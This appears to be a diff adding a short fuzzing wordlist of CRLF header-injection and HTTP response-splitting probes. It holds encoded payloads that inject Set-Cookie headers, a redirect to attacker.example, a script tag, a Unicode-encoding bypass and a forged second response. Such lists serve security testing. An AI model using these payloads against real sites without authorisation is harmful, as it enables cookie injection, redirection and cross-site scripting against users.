@@ -1,0 +1,9 @@
+# crlf/basic — header-injection / response-splitting probes
+%0d%0aSet-Cookie:%20injected=1
+%0d%0aLocation:%20https://attacker.example/
+%0d%0a%0d%0a<script>alert(1)</script>
+/%0d%0aX-Injected:%20yes
+%E5%98%8A%E5%98%8DSet-Cookie:%20injected=1
+%23%0d%0aSet-Cookie:%20injected=1
+%0d%0aContent-Length:%200
+%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html
